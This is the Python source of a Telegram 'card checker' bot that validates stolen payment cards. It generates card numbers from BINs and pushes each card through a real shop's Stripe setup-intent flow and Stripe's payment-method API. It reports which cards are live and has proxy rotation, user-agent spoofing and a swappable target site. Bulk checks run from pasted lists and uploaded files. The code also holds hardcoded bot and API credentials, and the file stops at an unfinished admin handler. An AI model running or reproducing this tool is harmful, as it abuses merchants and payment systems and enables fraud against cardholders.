
# ==== SAFE REQUEST PATCH ====
import requests

def safe_request(url, headers=None, data=None, method="POST"):
    try:
        if method == "POST":
            response = requests.post(url, headers=headers, data=data, timeout=15)
        else:
            response = requests.get(url, headers=headers, timeout=15)

        if response.status_code != 200:
            return {"error": f"HTTP {response.status_code}", "text": response.text[:200]}

        try:
            return response.json()
        except:
            return {"error": "Invalid JSON", "text": response.text[:200]}

    except Exception as e:
        return {"error": str(e)}

# ==== END PATCH ====

import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
BOT_TOKEN = '8766511783:AAGDriAWL_KiVUVvubSdyptuwWLdcwNzNHY'
ADMIN_ID = 5629984144
USERS_FILE = 'users.json'
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

CONFIG = {
    "api_url": "https://deveneys.ie/my-account/add-payment-method/",
    "stripe_url": "https://api.stripe.com/v1/payment_methods",
    "retry_count": 3,
    "retry_delay": 2,
}

COOLDOWN_CHECK = 10
COOLDOWN_MASS = 20
MAX_MASS_CARDS = 10
MAX_FILE_CARDS = 500

# ==================== GLOBAL VARIABLES ====================
bot = telebot.TeleBot(BOT_TOKEN)
approved_users = set()
pending_requests = {}
user_sessions = {}
user_cooldowns = {}
stop_checking = {}
user_custom_sites = {}
admin_default_site = None
ACTIVE_PROXY = None
PROXY_LOCK = threading.Lock()

# ==================== USER MANAGEMENT ====================
def load_users():
    """Load approved users and pending requests from file"""
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except:
            return set(), {}
    return set(), {}

def save_users():
    """Save approved users and pending requests to file"""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({
                'approved_users': list(approved_users), 
                'pending_requests': pending_requests
            }, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

def is_approved(user_id):
    """Check if user is approved"""
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    """Decorator to require user approval"""
    def wrapper(message):
        if not is_approved(message.from_user.id):
            text = "╔════════════════════════╗\n"
            text += "║     🚫 ACCESS DENIED     ║\n"
            text += "╚════════════════════════╝\n\n"
            text += "⚠️ <b>You need admin approval</b>\n"
            text += "📝 Use /request to get access\n"
            bot.send_message(message.chat.id, text, parse_mode='HTML')
            return
        return func(message)
    return wrapper

# ==================== PROXY MANAGEMENT ====================
def test_proxy(proxy_url):
    """Test if proxy is working"""
    try:
        response = requests.get(
            'https://api.stripe.com', 
            proxies={'http': proxy_url, 'https': proxy_url}, 
            timeout=10, 
            verify=False
        )
        return response.status_code in [200, 301, 302, 403, 404]
    except:
        return False

def set_proxy(proxy_url):
    """Set active proxy"""
    global ACTIVE_PROXY
    if test_proxy(proxy_url):
        with PROXY_LOCK:
            ACTIVE_PROXY = proxy_url
        return True, "Proxy is live and set successfully!"
    return False, "Proxy is dead or unreachable"

def remove_proxy():
    """Remove active proxy"""
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None
    return "Proxy removed. Using direct connection."

def get_proxies():
    """Get proxy configuration"""
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

# ==================== UTILITY FUNCTIONS ====================
def get_api_url(chat_id):
    """Get API URL for user (custom or default)"""
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        return user_custom_sites[chat_id]
    if admin_default_site:
        return admin_default_site
    return CONFIG["api_url"]

def generate_user_agent():
    """Generate random user agent"""
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ])

def check_cooldown(chat_id, command_type):
    """Check if user is on cooldown"""
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

# ==================== CARD FUNCTIONS ====================
def get_card_info(card_number):
    """Get card information from BIN"""
    info = {
        'brand': 'Unknown', 
        'type': 'Unknown', 
        'country': 'Unknown', 
        'flag': '🌍', 
        'bank': 'Unknown', 
        'level': 'Unknown'
    }
    bin_number = card_number[:6]
    
    # Try HandyAPI first
    if HANDYAPI_KEY:
        try:
            response = requests.get(
                f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'}, 
                timeout=10, 
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'): 
                    info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'): 
                    info['type'] = str(data['Type']).title()
                if data.get('Category'): 
                    info['level'] = str(data['Category']).title()
                elif data.get('CardTier'): 
                    info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'): 
                    info['bank'] = str(data['Issuer']).title()
                
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'): 
                        info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except:
            pass
    
    # Fallback to BinList
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, 
            timeout=10, 
            verify=False
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): 
                info['brand'] = data['scheme'].upper()
            if data.get('type'): 
                info['type'] = data['type'].title()
            if data.get('brand'): 
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): 
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): 
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    # Basic brand detection
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    """Validate card number using Luhn algorithm"""
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

def calculate_luhn_digit(partial_card):
    """Calculate Luhn check digit"""
    digits = [int(d) for d in str(partial_card) + '0']
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return (10 - (checksum % 10)) % 10

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    """Generate random cards from BIN"""
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        if exp_month and exp_year:
            month = int(exp_month)
            year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
            month = random.randint(1, 12)
            year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

# ==================== CARD CHECKER CLASS ====================
class CardChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.uuids = {
            "gu": str(uuid.uuid4()), 
            "mu": str(uuid.uuid4()), 
            "si": str(uuid.uuid4())
        }
        self.headers = {
            'user-agent': generate_user_agent(), 
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com', 
            'referer': 'https://js.stripe.com/',
        }
        self.session = requests.Session()
        
    def fetch_nonce_and_key(self):
        """Fetch nonce and Stripe key from gateway"""
        for attempt in range(CONFIG['retry_count']):
            try:
                response = self.session.get(
                    get_api_url(self.chat_id), 
                    headers=self.headers, 
                    proxies=get_proxies(), 
                    verify=False, 
                    timeout=30
                )
                if response.status_code == 200:
                    nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
                    key_match = re.search(r'"key":"(pk_[^"]+)"', response.text)
                    if nonce_match and key_match:
                        return nonce_match.group(1), key_match.group(1)
                
                if attempt < CONFIG['retry_count'] - 1:
                    time.sleep(CONFIG['retry_delay'])
            except:
                if attempt < CONFIG['retry_count'] - 1:
                    time.sleep(CONFIG['retry_delay'])
        return None, None
    
    def validate_card(self, card):
        """Validate card through Stripe"""
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌'}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌'}
            
            card_info = get_card_info(number)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info}
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
        except Exception as e:
            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '❌'}
        
        # Fetch nonce and key
        nonce, key = self.fetch_nonce_and_key()
        if not nonce or not key:
            return {'status': 'error', 'message': 'Failed to fetch gateway data', 'icon': '❌', 'card_info': card_info}
        
        # Create Stripe payment method
        stripe_data = {
            'type': 'card', 
            'card[number]': number, 
            'card[cvc]': cvv,
            'card[exp_year]': exp_year, 
            'card[exp_month]': exp_month,
            'guid': self.uuids["gu"], 
            'muid': self.uuids["mu"], 
            'sid': self.uuids["si"],
            'key': key, 
            '_stripe_version': '2024-06-20',
        }
        
        try:
            stripe_response = self.session.post(
                CONFIG["stripe_url"], 
                headers=self.headers, 
                data=stripe_data, 
                proxies=get_proxies(), 
                verify=False, 
                timeout=30
            )
            
            if stripe_response.status_code != 200:
                error_msg = stripe_response.json().get('error', {}).get('message', 'Stripe error')
                return {'status': 'dead', 'message': f'Card Declined - {error_msg}', 'icon': '❌', 'card_info': card_info}
            
            payment_method_id = stripe_response.json().get('id')
            if not payment_method_id:
                return {'status': 'error', 'message': 'No payment method ID', 'icon': '❌', 'card_info': card_info}
        except Exception as e:
            return {'status': 'error', 'message': f'Stripe error: {str(e)}', 'icon': '❌', 'card_info': card_info}
        
        # Confirm setup intent
        setup_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        try:
            confirm_response = self.session.post(
                get_api_url(self.chat_id), 
                params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                headers=self.headers, 
                data=setup_data, 
                proxies=get_proxies(), 
                verify=False, 
                timeout=30
            )
            
            response_text = confirm_response.text
            try:
                response_json = confirm_response.json()
            except:
                response_json = {}
            
            # Check response
            if response_json.get('success', False):
                return {'status': 'live', 'message': 'Card Live ✨', 'icon': '✅', 'card_info': card_info}
            
            if "security code is incorrect" in response_text.lower() or "incorrect_cvc" in response_text.lower():
                return {'status': 'live_cvc', 'message': 'Invalid CVC', 'icon': '⚠️', 'card_info': card_info}
            
            if "insufficient funds" in response_text.lower():
                return {'status': 'insufficient', 'message': 'Low Balance', 'icon': '💰', 'card_info': card_info}
            
            error_msg = response_json.get('data', {}).get('error', {}).get('message', 'Card Declined')
            return {'status': 'dead', 'message': error_msg, 'icon': '❌', 'card_info': card_info}
        except Exception as e:
            return {'status': 'error', 'message': f'Error: {str(e)}', 'icon': '❌', 'card_info': card_info}

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    if not is_approved(user_id):
        text = "╔═══════════════════════════╗\n"
        text += "║  <b>💳 CARD VALIDATOR BOT</b>  ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += "⚠️ <b>ACCESS REQUIRED</b> ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔═══════════════════════════╗\n"
        text += "║  <b>💳 YOSH CARD CHECKER</b>  ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += "🎯 <b>MAIN COMMANDS</b>\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /check - <i>Single card check</i>\n"
        text += "📦 /mass - <i>Multiple cards check</i>\n"
        text += "📁 /file - <i>Upload .txt file</i>\n"
        text += "🔍 /bin - <i>BIN lookup</i>\n"
        text += "🎲 /gen - <i>Generate cards</i>\n"
        text += "🌍 /custom_site - <i>Set your site</i>\n"
        text += "🗑️ /remove_site - <i>Remove site</i>\n"
        text += "📍 /site - <i>Check current site</i>\n"
        text += "❓ /help - <i>Show help</i>\n\n"
        
        if user_id == ADMIN_ID:
            text += "⚙️ <b>ADMIN COMMANDS</b>\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "🌐 /proxy - <i>Set proxy</i>\n"
            text += "🚫 /removeproxy - <i>Remove proxy</i>\n"
            text += "📊 /proxystatus - <i>Check status</i>\n"
            text += "👥 /users - <i>List users</i>\n"
            text += "⏳ /pending - <i>Pending requests</i>\n"
            text += "📢 /broadcast - <i>Send message</i>\n"
            text += "⚙️ /adminsettings - <i>Set default site</i>\n\n"
        
        text += "✨ <b>Powered by YOSH</b> ✨"
    
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['help'])
@require_approval
def show_help(message):
    text = "╔═══════════════════════════╗\n"
    text += "║     <b>📖 HELP & USAGE</b>     ║\n"
    text += "╚═══════════════════════════╝\n\n"
    text += "💳 <b>CARD FORMAT</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "<code>XXXX|MM|YY|CVV</code>\n"
    text += "<b>Example:</b> <code>4532123456789012|12|25|123</code>\n\n"
    text += "🎯 <b>COMMANDS</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "<b>/check CARD</b> - Check single card\n"
    text += "<b>/mass CARD1 CARD2...</b> - Check multiple\n"
    text += "<b>/file</b> - Upload .txt file with cards\n"
    text += "<b>/bin XXXXXX</b> - Lookup BIN info\n"
    text += "<b>/gen BIN QTY</b> - Generate cards\n\n"
    text += "⏱️ <b>COOLDOWNS</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"<b>/check:</b> {COOLDOWN_CHECK}s\n"
    text += f"<b>/mass & /file:</b> {COOLDOWN_MASS}s\n"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['check'])
@require_approval
def check_card(message):
    chat_id = message.chat.id
    
    can_proceed, wait_time = check_cooldown(chat_id, 'check')
    if not can_proceed:
        text = f"⏳ <b>Cooldown Active</b>\n\nPlease wait <code>{wait_time}</code> seconds"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    try:
        card = message.text.split(None, 1)[1].strip()
    except:
        text = "❌ <b>Invalid Usage</b>\n\n<b>Format:</b> <code>/check CARD|MM|YY|CVV</code>"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    status_msg = bot.send_message(chat_id, "⏳ <b>Checking your card...</b>", parse_mode='HTML')
    checker = CardChecker(chat_id)
    result = checker.validate_card(card)
    
    info = result.get('card_info', {})
    
    # Format result with enhanced design
    text = f"╔═══════════════════════════╗\n"
    text += f"     {result['icon']} <b>{result['message']}</b>\n"
    text += f"╚═══════════════════════════╝\n\n"
    text += f"💳 <b>Card:</b> <code>{card}</code>\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🏦 <b>Bank:</b> {info.get('bank', 'Unknown')}\n"
    text += f"🌍 <b>Country:</b> {info.get('flag', '🌍')} {info.get('country', 'Unknown')}\n"
    text += f"🔖 <b>Type:</b> {info.get('brand', 'Unknown')} {info.get('type', 'Unknown')}\n"
    text += f"💎 <b>Level:</b> {info.get('level', 'Unknown')}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
    
    bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['mass'])
@require_approval
def mass_check(message):
    chat_id = message.chat.id
    
    can_proceed, wait_time = check_cooldown(chat_id, 'mass')
    if not can_proceed:
        text = f"⏳ <b>Cooldown Active</b>\n\nPlease wait <code>{wait_time}</code> seconds"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    try:
        cards = message.text.split()[1:]
        if not cards:
            text = "❌ <b>Invalid Usage</b>\n\n<b>Format:</b> <code>/mass CARD1 CARD2 ...</code>"
            bot.send_message(chat_id, text, parse_mode='HTML')
            return
        if len(cards) > MAX_MASS_CARDS:
            bot.send_message(chat_id, f"❌ <b>Maximum {MAX_MASS_CARDS} cards allowed</b>", parse_mode='HTML')
            return
    except:
        text = "❌ <b>Invalid Usage</b>\n\n<b>Format:</b> <code>/mass CARD1 CARD2 ...</code>"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    stop_checking[chat_id] = False
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{chat_id}"))
    
    status_text = f"⏳ <b>Checking {len(cards)} cards...</b>\n\nPress button below to stop"
    status_msg = bot.send_message(chat_id, status_text, reply_markup=markup, parse_mode='HTML')
    checker = CardChecker(chat_id)
    
    results = {'cvv': 0, 'ccn': 0, 'low_funds': 0, 'declined': 0}
    
    for i, card in enumerate(cards):
        if stop_checking.get(chat_id, False):
            bot.edit_message_text(f"🛑 <b>Stopped at {i}/{len(cards)} cards</b>", chat_id, status_msg.message_id, parse_mode='HTML')
            return
        
        result = checker.validate_card(card)
        
        if result['status'] == 'live':
            results['cvv'] += 1
        elif result['status'] == 'live_cvc':
            results['ccn'] += 1
        elif result['status'] == 'insufficient':
            results['low_funds'] += 1
        else:
            results['declined'] += 1
        
        # Only show live cards
        if result['status'] in ['live', 'live_cvc', 'insufficient']:
            info = result.get('card_info', {})
            
            # Format with enhanced design
            text = f"╔═══════════════════════════╗\n"
            text += f"     {result['icon']} <b>{result['message']}</b>\n"
            text += f"╚═══════════════════════════╝\n\n"
            text += f"💳 <b>Card:</b> <code>{card}</code>\n"
            text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += f"🏦 <b>Bank:</b> {info.get('bank', 'Unknown')}\n"
            text += f"🌍 <b>Country:</b> {info.get('flag', '🌍')} {info.get('country', 'Unknown')}\n"
            text += f"🔖 <b>Type:</b> {info.get('brand', 'Unknown')} {info.get('type', 'Unknown')}\n"
            text += f"💎 <b>Level:</b> {info.get('level', 'Unknown')}\n"
            bot.send_message(chat_id, text, parse_mode='HTML')
    
    summary = f"╔═══════════════════════════╗\n"
    summary += f"║    <b>✅ CHECK COMPLETED</b>    ║\n"
    summary += f"╚═══════════════════════════╝\n\n"
    summary += f"• <b>CVV ➜ [ {results['cvv']} ] •</b>\n\n"
    summary += f"• <b>CCN ➜ [ {results['ccn']} ] •</b>\n\n"
    summary += f"• <b>LOW FUNDS ➜ [ {results['low_funds']} ] •</b>\n\n"
    summary += f"• <b>DECLINED ➜ [ {results['declined']} ] •</b>\n\n"
    summary += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    summary += f"📊 <b>Total Checked:</b> {len(cards)}"
    bot.edit_message_text(summary, chat_id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['file'])
@require_approval
def file_check(message):
    text = "╔═══════════════════════════╗\n"
    text += "║   <b>📁 FILE UPLOAD MODE</b>   ║\n"
    text += "╚═══════════════════════════╝\n\n"
    text += "📤 Send me a <code>.txt</code> file\n"
    text += "📝 One card per line\n"
    text += f"⚠️ Max {MAX_FILE_CARDS} cards"
    bot.send_message(message.chat.id, text, parse_mode='HTML')
    bot.register_next_step_handler(message, process_file)

def process_file(message):
    chat_id = message.chat.id
    
    can_proceed, wait_time = check_cooldown(chat_id, 'mass')
    if not can_proceed:
        text = f"⏳ <b>Cooldown Active</b>\n\nPlease wait <code>{wait_time}</code> seconds"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    if not message.document:
        bot.send_message(chat_id, "❌ <b>Please send a .txt file</b>", parse_mode='HTML')
        return
    
    if not message.document.file_name.endswith('.txt'):
        bot.send_message(chat_id, "❌ <b>Only .txt files are allowed</b>", parse_mode='HTML')
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').strip().split('\n')
        cards = [c.strip() for c in cards if c.strip()]
        
        if len(cards) > MAX_FILE_CARDS:
            bot.send_message(chat_id, f"❌ <b>Maximum {MAX_FILE_CARDS} cards allowed</b>", parse_mode='HTML')
            return
        
        stop_checking[chat_id] = False
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{chat_id}"))
        
        status_text = f"╔═══════════════════════════╗\n"
        status_text += f"║    <b>⏳ CHECKING FILE</b>     ║\n"
        status_text += f"╚═══════════════════════════╝\n\n"
        status_text += f"• <b>CVV ➜ [ 0 ] •</b>\n\n"
        status_text += f"• <b>CCN ➜ [ 0 ] •</b>\n\n"
        status_text += f"• <b>LOW FUNDS ➜ [ 0 ] •</b>\n\n"
        status_text += f"• <b>DECLINED ➜ [ 0 ] •</b>\n\n"
        status_text += f"• <b>PROGRESS ➜ [ 0/{len(cards)} ] •</b>\n\n"
        status_text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        status_text += f"<b>[ STOP ]</b>"
        
        status_msg = bot.send_message(chat_id, status_text, reply_markup=markup, parse_mode='HTML')
        checker = CardChecker(chat_id)
        
        results = {'cvv': 0, 'ccn': 0, 'low_funds': 0, 'declined': 0}
        live_cards = []
        
        for i, card in enumerate(cards):
            if stop_checking.get(chat_id, False):
                break
            
            result = checker.validate_card(card)
            
            if result['status'] == 'live':
                results['cvv'] += 1
                live_cards.append(card)
            elif result['status'] == 'live_cvc':
                results['ccn'] += 1
                live_cards.append(card)
            elif result['status'] == 'insufficient':
                results['low_funds'] += 1
                live_cards.append(card)
            else:
                results['declined'] += 1
            
            # Update progress every card
            progress_text = f"╔═══════════════════════════╗\n"
            progress_text += f"║    <b>⏳ CHECKING FILE</b>     ║\n"
            progress_text += f"╚═══════════════════════════╝\n\n"
            progress_text += f"• <b>CVV ➜ [ {results['cvv']} ] •</b>\n\n"
            progress_text += f"• <b>CCN ➜ [ {results['ccn']} ] •</b>\n\n"
            progress_text += f"• <b>LOW FUNDS ➜ [ {results['low_funds']} ] •</b>\n\n"
            progress_text += f"• <b>DECLINED ➜ [ {results['declined']} ] •</b>\n\n"
            progress_text += f"• <b>PROGRESS ➜ [ {i+1}/{len(cards)} ] •</b>\n\n"
            progress_text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            progress_text += f"<b>[ STOP ]</b>"
            
            try:
                bot.edit_message_text(progress_text, chat_id, status_msg.message_id, reply_markup=markup, parse_mode='HTML')
            except:
                pass
        
        summary = f"╔═══════════════════════════╗\n"
        summary += f"║   <b>✅ CHECK COMPLETED</b>    ║\n"
        summary += f"╚═══════════════════════════╝\n\n"
        summary += f"• <b>CVV ➜ [ {results['cvv']} ] •</b>\n\n"
        summary += f"• <b>CCN ➜ [ {results['ccn']} ] •</b>\n\n"
        summary += f"• <b>LOW FUNDS ➜ [ {results['low_funds']} ] •</b>\n\n"
        summary += f"• <b>DECLINED ➜ [ {results['declined']} ] •</b>\n\n"
        summary += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        summary += f"📊 <b>Total:</b> {len(cards)} cards\n"
        summary += f"✅ <b>Live:</b> {results['cvv'] + results['ccn'] + results['low_funds']}\n"
        summary += f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
        bot.edit_message_text(summary, chat_id, status_msg.message_id, parse_mode='HTML')
        
        if live_cards:
            live_text = "╔═══════════════════════════╗\n"
            live_text += "║     <b>💎 LIVE CARDS</b>      ║\n"
            live_text += "╚═══════════════════════════╝\n\n"
            for idx, card in enumerate(live_cards[:50], 1):
                live_text += f"{idx}. <code>{card}</code>\n"
            if len(live_cards) > 50:
                live_text += f"\n<b>... and {len(live_cards) - 50} more</b>"
            bot.send_message(chat_id, live_text, parse_mode='HTML')
        else:
            bot.send_message(chat_id, "❌ <b>No live cards found</b>", parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode='HTML')

@bot.message_handler(commands=['bin'])
@require_approval
def bin_lookup(message):
    try:
        bin_number = message.text.split()[1][:6]
        if not bin_number.isdigit() or len(bin_number) < 6:
            bot.send_message(message.chat.id, "❌ <b>Invalid BIN. Use 6 digits</b>", parse_mode='HTML')
            return
    except:
        bot.send_message(message.chat.id, "❌ <b>Usage:</b> <code>/bin XXXXXX</code>", parse_mode='HTML')
        return
    
    info = get_card_info(bin_number + "0000000000")
    text = "╔═══════════════════════════╗\n"
    text += "║      <b>🔍 BIN LOOKUP</b>      ║\n"
    text += "╚═══════════════════════════╝\n\n"
    text += f"🔖 <b>BIN:</b> <code>{bin_number}</code>\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🏦 <b>Bank:</b> {info['bank']}\n"
    text += f"🌍 <b>Country:</b> {info['flag']} {info['country']}\n"
    text += f"💳 <b>Brand:</b> {info['brand']}\n"
    text += f"📌 <b>Type:</b> {info['type']}\n"
    text += f"💎 <b>Level:</b> {info['level']}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['gen'])
@require_approval
def generate_cards_command(message):
    try:
        parts = message.text.split()
        bin_number = parts[1]
        quantity = int(parts[2]) if len(parts) > 2 else 10
        
        cards, error = generate_cards(bin_number, quantity)
        if error:
            bot.send_message(message.chat.id, f"❌ <b>{error}</b>", parse_mode='HTML')
            return
        
        text = "╔═══════════════════════════╗\n"
        text += "║   <b>🎲 GENERATED CARDS</b>    ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += f"<b>BIN:</b> <code>{bin_number}</code>\n"
        text += f"<b>Quantity:</b> {len(cards)}\n"
        text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        text += "\n".join([f"<code>{card}</code>" for card in cards])
        bot.send_message(message.chat.id, text, parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "❌ <b>Usage:</b> <code>/gen BIN QUANTITY</code>", parse_mode='HTML')

@bot.message_handler(commands=['custom_site'])
@require_approval
def custom_site(message):
    try:
        url = message.text.split(None, 1)[1].strip()
        if not url.startswith('http'):
            bot.send_message(message.chat.id, "❌ <b>URL must start with http:// or https://</b>", parse_mode='HTML')
            return
        user_custom_sites[message.chat.id] = url
        text = "╔═══════════════════════════╗\n"
        text += "║   <b>✅ SITE CONFIGURED</b>    ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += f"🌍 <b>Custom site set to:</b>\n<code>{url}</code>"
        bot.send_message(message.chat.id, text, parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "❌ <b>Usage:</b> <code>/custom_site URL</code>", parse_mode='HTML')

@bot.message_handler(commands=['remove_site'])
@require_approval
def remove_site(message):
    if message.chat.id in user_custom_sites:
        del user_custom_sites[message.chat.id]
        text = "╔═══════════════════════════╗\n"
        text += "║    <b>✅ SITE REMOVED</b>      ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += "🔄 Using default site now"
        bot.send_message(message.chat.id, text, parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, "❌ <b>No custom site set</b>", parse_mode='HTML')

@bot.message_handler(commands=['site'])
@require_approval
def show_site(message):
    chat_id = message.chat.id
    text = "╔═══════════════════════════╗\n"
    text += "║    <b>📍 CURRENT SITE</b>      ║\n"
    text += "╚═══════════════════════════╝\n\n"
    
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        text += f"🌍 <b>Your Custom Site:</b>\n<code>{user_custom_sites[chat_id]}</code>"
    elif admin_default_site:
        text += f"🌍 <b>Using Admin Default Site</b>\n<i>(Site URL is hidden)</i>"
    else:
        text += f"🌍 <b>Using Bot Default Site</b>\n<i>(Site URL is hidden)</i>"
    
    bot.send_message(message.chat.id, text, parse_mode='HTML')

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['proxy'])
